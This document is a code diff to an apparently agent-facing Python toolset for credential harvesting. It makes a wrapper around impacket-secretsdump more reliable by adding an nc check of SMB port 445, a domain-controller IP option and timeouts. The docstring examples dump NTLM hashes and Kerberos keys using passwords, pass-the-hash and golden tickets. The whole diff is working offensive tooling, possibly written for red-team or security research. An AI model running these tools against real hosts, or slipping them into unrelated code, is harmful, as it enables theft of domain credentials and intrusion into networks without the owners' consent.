@@ -193,6 +193,27 @@ class CredentialHarvestingTools(Toolset):
         """Set the operation state for this toolset."""
         self.state = state
 
+    def _check_smb_connectivity(self, target: str, timeout_seconds: int = 5) -> tuple[bool, str]:
+        """Check if SMB port 445 is reachable on target.
+
+        Args:
+            target: Target IP address
+            timeout_seconds: Connection timeout for nc command
+
+        Returns:
+            Tuple of (is_reachable, error_message)
+        """
+        cmd = ["nc", "-zv", "-w", str(timeout_seconds), target, "445"]
+        try:
+            # AWS SSM has a minimum timeout of 30 seconds
+            ssm_timeout = max(30, timeout_seconds + 5)
+            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=ssm_timeout)
+            if returncode == 0:
+                return True, ""
+            return False, f"SMB port 445 not reachable: {stderr or stdout}"
+        except Exception as e:
+            return False, f"Connectivity check failed: {e}"
+
     @dn.tool_method
     def secretsdump(
         self,
@@ -201,8 +222,11 @@ class CredentialHarvestingTools(Toolset):
         password: str | None = None,
         hash: str | None = None,
         domain: str | None = None,
+        dc_ip: str | None = None,
         no_pass: bool = False,
-        timeout_minutes: int = 10,
+        timeout_minutes: int = 3,
+        connection_timeout: int = 30,
+        skip_connectivity_check: bool = False,
     ) -> str:
         """
         Extract secrets using impacket-secretsdump for credential harvesting.
@@ -217,18 +241,32 @@ class CredentialHarvestingTools(Toolset):
             password: Password for the username (optional)
             hash: NTLM hash for pass-the-hash authentication (optional)
             domain: Domain name (optional, can be inferred)
+            dc_ip: Domain controller IP address (recommended for DC targets to avoid DNS issues)
             no_pass: If True, use Kerberos golden ticket authentication
-            timeout_minutes: Maximum time to spend dumping (default: 10)
+            timeout_minutes: Maximum time to spend dumping (default: 3)
+            connection_timeout: Timeout for initial SMB connection in seconds (default: 30)
+            skip_connectivity_check: Skip the SMB port check (default: False)
 
         Returns:
             Extracted credentials including NTLM hashes, Kerberos keys, and secrets
 
         Example:
             >>> secretsdump("192.168.1.100", "Administrator", password="P@ssw0rd")  # pragma: allowlist secret
-            >>> secretsdump("192.168.1.100", "Administrator", hash="aad3b4...", domain="DOMAIN")
+            >>> secretsdump("192.168.1.100", "Administrator", hash="aad3b4...", domain="DOMAIN", dc_ip="192.168.1.100")
             >>> secretsdump("domain.local", "Administrator", no_pass=True)  # golden ticket
         """
-        cmd = ["impacket-secretsdump"]
+        # Pre-check SMB connectivity to fail fast
+        if not skip_connectivity_check:
+            is_reachable, error_msg = self._check_smb_connectivity(target)
+            if not is_reachable:
+                return f"[!] Target {target} is not reachable on SMB port 445. {error_msg}"
+
+        # Use timeout command to enforce connection-level timeout
+        cmd = ["timeout", str(connection_timeout), "impacket-secretsdump"]
+
+        # Add dc-ip flag if provided (helps avoid DNS resolution hangs)
+        if dc_ip:
+            cmd.extend(["-dc-ip", dc_ip])
 
         if password and domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -256,6 +294,10 @@ class CredentialHarvestingTools(Toolset):
             logger.info(f"[*] Running secretsdump on {target} with {username}")
 
             stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=timeout_minutes * 60)
+
+            # Check for timeout exit code (124 from timeout command)
+            if returncode == 124:
+                return f"[!] Secretsdump timed out after {connection_timeout}s connecting to {target}. Target may be unreachable or credentials invalid."
 
             logger.info(f"[*] Secretsdump completed for {target}")
             return stdout or stderr or f"Secretsdump returned code {returncode}"
